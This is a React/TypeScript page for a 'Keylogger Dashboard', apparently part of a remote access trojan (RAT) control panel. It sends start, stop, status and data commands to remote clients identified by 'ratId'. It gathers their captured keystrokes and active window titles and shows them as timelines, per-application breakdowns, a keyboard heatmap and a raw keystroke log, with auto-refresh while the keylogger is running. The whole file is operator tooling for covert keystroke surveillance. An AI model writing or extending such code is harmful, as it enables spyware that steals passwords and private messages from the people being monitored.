"use client"

import { useState, useEffect } from "react"
import { AppLayout } from "@/components/layout/AppLayout"
import { KeyboardHeatmap } from "@/components/keylogger/KeyboardHeatmap"
import { ActivityTimeline } from "@/components/keylogger/ActivityTimeline"
import { ApplicationContext } from "@/components/keylogger/ApplicationContext"
import { ClientSelector } from "@/components/keylogger/ClientSelector"
import { useClientsContext } from "@/contexts/ClientsContext"
import { Keyboard, Clock, Layout, Play, Square, RefreshCw } from "lucide-react"
import { toast } from "sonner"
import axios from "axios"
import type { KeylogEntry, ApplicationData } from "@/types/keylogger"
import { KeystrokeLog } from "@/components/keylogger/KeystrokeLog"

const API_BASE_URL = "/api"

export function KeyloggerPage() {
  const { clients } = useClientsContext()
  const [selectedClientId, setSelectedClientId] = useState<string | null>(null)
  const [keylogData, setKeylogData] = useState<KeylogEntry[]>([])
  const [applicationData, setApplicationData] = useState<ApplicationData[]>([])
  const [timeRange, setTimeRange] = useState<"1h" | "24h" | "7d" | "30d">("24h")
  const [isLoading, setIsLoading] = useState(false)
  const [isRefreshing, setIsRefreshing] = useState(false)
  const [keyloggerActive, setKeyloggerActive] = useState(false)
  const [rawKeystrokes, setRawKeystrokes] = useState<string[]>([])
  const [hasData, setHasData] = useState(false)

  // Load real data when client is selected
  useEffect(() => {
    if (selectedClientId) {
      fetchKeyloggerStatus()
      fetchKeyloggerData()
    } else {
      setKeylogData([])
      setApplicationData([])
      setKeyloggerActive(false)
      setRawKeystrokes([])
      setHasData(false)
    }
  }, [selectedClientId])

  // Fetch new data when time range changes
  useEffect(() => {
    if (selectedClientId) {
      fetchKeyloggerData()
    }
  }, [timeRange])

  const fetchKeyloggerStatus = async () => {
    if (!selectedClientId) return

    try {
      const response = await axios.post(`${API_BASE_URL}/keylogger`, {
        ratId: selectedClientId,
        command: "get_status",
      })

      // Check if we got a successful response with keylog data
      if (response.data && response.data.Success) {
        setKeyloggerActive(response.data.Success.KeyloggerResponse.is_active)
      } else {
        setKeyloggerActive(false)
      }
    } catch (error) {
      console.error("Error checking keylogger status:", error)
      setKeyloggerActive(false)
    }
  }

  const fetchKeyloggerData = async (isRefresh = false) => {
    if (!selectedClientId) return

    // Use refresh spinner or full loading based on if it's a refresh action or initial load
    if (isRefresh) {
      setIsRefreshing(true)
    } else if (!hasData) {
      setIsLoading(true)
    }

    try {
      const response = await axios.post(`${API_BASE_URL}/keylogger`, {
        ratId: selectedClientId,
        command: "get_data",
      })

      // Check if we have the Success.KeylogData structure
      if (response.data && response.data.Success && response.data.Success.KeylogData) {
        const keylogData = response.data.Success.KeylogData

        // Extract all keystrokes from all sessions
        const allKeystrokes: string[] = []
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        keylogData.forEach((session: any) => {
          if (session.keystrokes && Array.isArray(session.keystrokes)) {
            allKeystrokes.push(...session.keystrokes)
          }
        })

        // Filter out periodic checks for the raw keystroke display
        const filteredKeystrokes = allKeystrokes.filter(
          keystroke => !keystroke.includes("[PERIODIC_CHECK]")
        )

        // Store the raw keystrokes (filtered for display)
        setRawKeystrokes(filteredKeystrokes)

        // Transform keystrokes data to KeylogEntry format
        // Note: We pass the unfiltered keystrokes to processKeystrokes which does its own filtering
        const transformedKeylogData: KeylogEntry[] = processKeystrokes(
          allKeystrokes,
          timeRange,
          // eslint-disable-next-line @typescript-eslint/no-explicit-any
          keylogData.reduce((acc: Record<string, number>, session: any) => {
            if (session.statistics?.window_activity) {
              Object.entries(session.statistics.window_activity).forEach(([window, count]) => {
                acc[window] = (acc[window] || 0) + (count as number)
              })
            }
            return acc
          }, {})
        )
        setKeylogData(transformedKeylogData)
        console.log("Transformed Keylog Data:", transformedKeylogData) // For debugging
        // Transform window activity data to ApplicationData format
        // This uses all keystrokes including PERIODIC_CHECK entries to maintain accurate application context
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        const windowActivity = keylogData.reduce((acc: Record<string, number>, session: any) => {
          if (session.statistics?.window_activity) {
            Object.entries(session.statistics.window_activity).forEach(([window, count]) => {
              acc[window] = (acc[window] || 0) + (count as number)
            })
          }
          return acc
        }, {})

        const transformedAppData: ApplicationData[] = processApplicationData(windowActivity)
        setApplicationData(transformedAppData)

        // Indicate we now have data to display
        setHasData(true)

        // Show success toast on manual refresh
        if (isRefresh) {
          toast.success("Data refreshed successfully")
        }
      } else {
        // No data available - might be because keylogger is not active
        setKeylogData([])
        setApplicationData([])
        setRawKeystrokes([])
        setHasData(false)

        if (!response.data.Success) {
          toast.error("Failed to fetch keylogger data")
        }
      }
    } catch (error) {
      console.error("Error fetching keylogger data:", error)
      toast.error("Failed to fetch keylogger data")
      setKeylogData([])
      setApplicationData([])
      setRawKeystrokes([])
      setHasData(false)
    } finally {
      setIsLoading(false)
      setIsRefreshing(false)
    }
  }

  const handleRefresh = () => {
    fetchKeyloggerData(true)
  }

  const startKeylogger = async () => {
    if (!selectedClientId) return

    try {
      setIsLoading(true)
      const response = await axios.post(`${API_BASE_URL}/keylogger`, {
        ratId: selectedClientId,
        command: "start",
      })

      if (response.data && response.data.Success) {
        toast.success("Keylogger started successfully")
        setKeyloggerActive(true)
        // Fetch initial data after a short delay
        setTimeout(() => fetchKeyloggerData(false), 1000)
      } else {
        toast.error("Failed to start keylogger")
      }
    } catch (error) {
      console.error("Error starting keylogger:", error)
      toast.error("Failed to start keylogger")
    } finally {
      setIsLoading(false)
    }
  }

  const stopKeylogger = async () => {
    if (!selectedClientId) return

    try {
      setIsLoading(true)
      const response = await axios.post(`${API_BASE_URL}/keylogger`, {
        ratId: selectedClientId,
        command: "stop",
      })

      if (response.data && response.data.Success) {
        toast.success("Keylogger stopped successfully")
        setKeyloggerActive(false)
      } else {
        toast.error("Failed to stop keylogger")
      }
    } catch (error) {
      console.error("Error stopping keylogger:", error)
      toast.error("Failed to stop keylogger")
    } finally {
      setIsLoading(false)
    }
  }

  // Process raw keystrokes into a format suitable for our components
  const processKeystrokes = (
    keystrokes: string[],
    selectedTimeRange: string,
    // Rename to underscore since we're not using it but need to keep the parameter
    // eslint-disable-next-line @typescript-eslint/no-unused-vars
    _windowActivity: Record<string, number>,
  ): KeylogEntry[] => {
    if (!keystrokes || keystrokes.length === 0) return []

    // Calculate the cutoff time based on selected time range
    const now = Date.now()
    let cutoffTime: number

    switch (selectedTimeRange) {
      case "1h":
        cutoffTime = now - 60 * 60 * 1000
        break
      case "24h":
        cutoffTime = now - 24 * 60 * 60 * 1000
        break
      case "7d":
        cutoffTime = now - 7 * 24 * 60 * 60 * 1000
        break
      case "30d":
        cutoffTime = now - 30 * 24 * 60 * 60 * 1000
        break
      default:
        cutoffTime = now - 24 * 60 * 60 * 1000
    }

    // Group keystrokes by windows/applications
    const keystrokesByApp: Record<string, string[]> = {}
    let currentApp = "Unknown Application"

    // Remove unused variable
    // const processedKeystrokes: string[] = []

    keystrokes.forEach((keystroke) => {
      // Check if this is a window change notification
      const windowChangeMatch = keystroke.match(/\[Window changed from '(.+)' to '(.+)'\]/)
      const windowChangeIndicator = keystroke.match(/\[WINDOW_CHANGE\] $$in (.+)$$/)

      if (windowChangeMatch) {
        currentApp = windowChangeMatch[2]
      } else if (windowChangeIndicator) {
        currentApp = windowChangeIndicator[1]
      }

      if (!keystrokesByApp[currentApp]) {
        keystrokesByApp[currentApp] = []
      }

      // Only add actual keystrokes, not window change notifications or periodic checks
      if (!keystroke.includes("[Window changed from") &&
        !keystroke.includes("[WINDOW_CHANGE]") &&
        !keystroke.includes("[PERIODIC_CHECK]")) {

        // Clean up the keystroke by removing context information like "(in @hqnw - discord)"
        const cleanedKeystroke = keystroke.replace(/\s*\(in [^)]+\)\s*/g, '');

        // Add the cleaned keystroke to the app's keystrokes array
        keystrokesByApp[currentApp].push(cleanedKeystroke);
      }
    });

    // Group keystrokes by time intervals (5 minute chunks)
    const intervalMs = 5 * 60 * 1000 // 5 minutes
    const entries: KeylogEntry[] = []

    // Distribute keystrokes over time for each application
    Object.entries(keystrokesByApp).forEach(([appName, appKeystrokes]) => {
      // Simulate timestamps since the actual API doesn't provide them
      let simulatedTime = now - appKeystrokes.length * 100

      // Create chunks of keystrokes for visualization
      for (let i = 0; i < appKeystrokes.length; i += 10) {
        const chunk = appKeystrokes.slice(i, i + 10)
        simulatedTime += 1000 // Add some time between chunks

        if (simulatedTime >= cutoffTime) {
          const bucketTime = Math.floor(simulatedTime / intervalMs) * intervalMs

          entries.push({
            id: `entry-${appName}-${bucketTime}-${i}`,
            timestamp: bucketTime,
            keys: chunk.flatMap(keystroke => {
              // Process special keys like [Shift], [Ctrl], etc.
              const specialKeys = keystroke.match(/\[(.*?)\]/g) || [];

              // Process Key.special format keys (e.g., Key.backspace, Key.enter)
              const keyDotFormat = keystroke.match(/Key\.([\w_]+)/g) || [];

              // Process both types of special keys
              const processedSpecialKeys = [
                ...specialKeys.map(key => {
                  // Remove brackets and normalize key names
                  const keyName = key.replace('[', '').replace(']', '').toLowerCase();

                  // Normalize key names for better heatmap compatibility
                  if (keyName.includes('shift')) return 'shift';
                  if (keyName.includes('control') || keyName.includes('ctrl')) return 'ctrl';
                  if (keyName.includes('alt')) return 'alt';
                  if (keyName.includes('win') || keyName.includes('meta')) return 'win';
                  if (keyName.includes('backspace')) return 'backspace';
                  if (keyName.includes('enter') || keyName.includes('return')) return 'enter';
                  if (keyName.includes('space')) return 'space';
                  if (keyName.includes('tab')) return 'tab';
                  if (keyName.includes('caps')) return 'caps';

                  return keyName;
                }),
                ...keyDotFormat.map(key => {
                  // Extract the key name after the dot
                  const keyName = key.split('.')[1].toLowerCase();

                  // Map common special key names
                  if (keyName === 'backspace') return 'backspace';
                  if (keyName === 'enter' || keyName === 'return') return 'enter';
                  if (keyName === 'space') return 'space';
                  if (keyName === 'tab') return 'tab';
                  if (keyName === 'caps_lock' || keyName === 'capslock') return 'caps';
                  if (keyName === 'shift' || keyName === 'shift_l' || keyName === 'shift_r') return 'shift';
                  if (keyName === 'ctrl' || keyName === 'control_l' || keyName === 'control_r') return 'ctrl';
                  if (keyName === 'alt' || keyName === 'alt_l' || keyName === 'alt_r' || keyName === 'alt_gr') return 'alt';
                  if (keyName === 'super' || keyName === 'meta' || keyName === 'win') return 'win';

                  return keyName;
                })
              ];

              // Extract the normal characters
              // First remove any context text like "(in @hqnw - discord)"
              let cleanKeystroke = keystroke.replace(/\s*\(in [^)]+\)\s*/g, '');

              // Then remove special keys in both formats
              cleanKeystroke = cleanKeystroke
                .replace(/\[.*?\]/g, '')      // Remove [Key] format
                .replace(/Key\.\w+/g, '')     // Remove Key.format
                .trim();

              // Split into individual characters and lowercase them
              const regularChars = cleanKeystroke ?
                cleanKeystroke.split('').map(char => char.toLowerCase()) : [];

              // Return the combined keys
              return [...processedSpecialKeys, ...regularChars];
            }),
            application: appName,
            windowTitle: appName,
          })
        }
      }
    })

    return entries.sort((a, b) => a.timestamp - b.timestamp)
  }

  // Process window activity data into ApplicationData format
  const processApplicationData = (windowActivity: Record<string, number>): ApplicationData[] => {
    if (!windowActivity || Object.keys(windowActivity).length === 0) {
      return []
    }

    return Object.entries(windowActivity)
      .map(([windowTitle, keystrokeCount]) => {
        // Extract application name from window title (simple approach)
        const parts = windowTitle.split(" - ")
        const applicationName = parts.length > 1 ? parts[parts.length - 1] : windowTitle

        return {
          applicationName,
          keystrokeCount,
          windowTitles: [windowTitle],
          percentage: 0, // Will calculate this below
        }
      })
      .map((appData, _, array) => {
        // Calculate the percentage of total keystrokes
        const totalKeystrokes = array.reduce((sum, app) => sum + app.keystrokeCount, 0)
        return {
          ...appData,
          percentage: totalKeystrokes > 0 ? (appData.keystrokeCount / totalKeystrokes) * 100 : 0,
        }
      })
      .sort((a, b) => b.keystrokeCount - a.keystrokeCount)
  }

  const handleClientChange = (clientId: string) => {
    setSelectedClientId(clientId)
  }

  const handleTimeRangeChange = (range: "1h" | "24h" | "7d" | "30d") => {
    setTimeRange(range)
  }

  // refetch keylogger data with interval
  useEffect(() => {
    if (!selectedClientId) return;

    // Clean previous interval when client changes
    let intervalId: NodeJS.Timeout;

    // Only set up auto-refresh if keylogger is active
    if (keyloggerActive) {
      intervalId = setInterval(() => {
        fetchKeyloggerData(false);
      }, 6000);
    }

    // Always clean up
    return () => {
      if (intervalId) clearInterval(intervalId);
    };
  }, [selectedClientId, keyloggerActive]);

  return (
    <AppLayout headerTitle="Keylogger Dashboard">
      <div className="space-y-6">
        {/* Header with client selector */}
        <div className="glass-card p-4 rounded-lg">
          <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
            <div>
              <h2 className="text-xl font-bold flex items-center gap-2">
                <Keyboard className="h-5 w-5 text-primary" />
                Keylogger Dashboard
              </h2>
              <p className="text-sm text-muted-foreground mt-1">
                Visualize keystroke data and application context from remote clients
              </p>
            </div>

            <div className="flex items-center gap-3">
              {selectedClientId && (
                <div>
                  {keyloggerActive ? (
                    <button
                      onClick={stopKeylogger}
                      disabled={isLoading}
                      className="bg-destructive text-destructive-foreground px-3 py-1.5 rounded flex items-center gap-2 text-sm hover:bg-destructive/90 transition-colors disabled:opacity-50"
                    >
                      <Square className="h-4 w-4" />
                      Stop Keylogger
                    </button>
                  ) : (
                    <button
                      onClick={startKeylogger}
                      disabled={isLoading}
                      className="bg-primary text-primary-foreground px-3 py-1.5 rounded flex items-center gap-2 text-sm hover:bg-primary/90 transition-colors disabled:opacity-50"
                    >
                      <Play className="h-4 w-4" />
                      Start Keylogger
                    </button>
                  )}
                </div>
              )}
              <ClientSelector
                // clients={clients.filter((c) => c.connected)}
                clients={clients}
                selectedClientId={selectedClientId}
                onClientChange={handleClientChange}
              />
            </div>
          </div>
        </div>

        {!selectedClientId ? (
          <div className="glass-card p-8 rounded-lg flex flex-col items-center justify-center text-center">
            <Keyboard className="h-12 w-12 text-muted-foreground mb-4" />
            <h3 className="text-lg font-medium">No Client Selected</h3>
            <p className="text-muted-foreground max-w-md mt-2">
              Please select a client from the dropdown above to view keylogger data and visualizations.
            </p>
          </div>
        ) : isLoading && !hasData ? (
          <div className="glass-card p-8 rounded-lg flex flex-col items-center justify-center">
            <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-primary mb-4"></div>
            <p className="text-muted-foreground">Loading keylogger data...</p>
          </div>
        ) : hasData ? (
          <>
            {/* Warning banner if keylogger is not active but data is available */}
            {!keyloggerActive && (
              <div className="glass-card p-4 rounded-lg mb-4 bg-amber-500/10 border border-amber-500/20">
                <div className="flex items-center gap-2 text-amber-500">
                  <Keyboard className="h-5 w-5" />
                  <p className="font-medium">
                    Keylogger is not currently active. Showing previously collected data.
                  </p>
                </div>
              </div>
            )}

            {/* Time range selector with refresh button */}
            <div className="flex justify-end mb-4 gap-2 items-center">
              <button
                onClick={handleRefresh}
                disabled={isRefreshing}
                className="bg-secondary text-secondary-foreground rounded-lg p-2 flex items-center justify-center hover:bg-secondary/80 transition-colors disabled:opacity-50"
                title="Refresh data"
              >
                <RefreshCw className={`h-5 w-5 ${isRefreshing ? 'animate-spin' : ''}`} />
              </button>

              <div className="glass-card rounded-lg p-1 flex">
                {(["1h", "24h", "7d", "30d"] as const).map((range) => (
                  <button
                    key={range}
                    className={`px-3 py-1.5 rounded-md text-sm font-medium ${timeRange === range ? "bg-primary text-primary-foreground" : "hover:bg-secondary/50"
                      }`}
                    onClick={() => handleTimeRangeChange(range)}
                  >
                    {range}
                  </button>
                ))}
              </div>
            </div>

            {/* Main content grid */}
            
            
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">

              {/* Activity Timeline (full width) */}
              <div className="glass-card p-4 rounded-lg">
                <h3 className="text-lg font-semibold mb-4 flex items-center gap-2">
                  <Clock className="h-5 w-5 text-primary" />
                  Activity Timeline
                </h3>
                <ActivityTimeline keylogData={keylogData} timeRange={timeRange} />
              </div>
              {/* Application Context */}
              <div className="glass-card p-4 rounded-lg">
                <h3 className="text-lg font-semibold mb-4 flex items-center gap-2">
                  <Layout className="h-5 w-5 text-primary" />
                  Application Context
                </h3>
                <ApplicationContext applicationData={applicationData} />
              </div>
            </div>
              <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">

              {/* Keyboard Heatmap */}
              <div className="glass-card p-4 rounded-lg">
                <h3 className="text-lg font-semibold mb-4 flex items-center gap-2">
                  <Keyboard className="h-5 w-5 text-primary" />
                  Keyboard Heatmap
                </h3>
                <KeyboardHeatmap keylogData={keylogData} />
              </div>
              {/* Raw Keystrokes Log */}
              <div className="glass-card p-4 rounded-lg">
                <h3 className="text-lg font-semibold mb-4 flex items-center gap-2">
                  <Keyboard className="h-5 w-5 text-primary" />
                  Keystroke Log
                </h3>
                <KeystrokeLog keystrokes={rawKeystrokes} />
              </div>
            </div>
          </>
        ) : (
          <div className="glass-card p-8 rounded-lg flex flex-col items-center justify-center text-center">
            <Keyboard className="h-12 w-12 text-muted-foreground mb-4" />
            <h3 className="text-lg font-medium">No Keylogger Data Available</h3>
            <p className="text-muted-foreground max-w-md mt-2">
              {!keyloggerActive
                ? "Click the \"Start Keylogger\" button above to begin capturing keystroke data."
                : "The keylogger is active but no data has been collected yet. Data will appear here once available."}
            </p>
          </div>
        )}
      </div>
    </AppLayout>
  )
}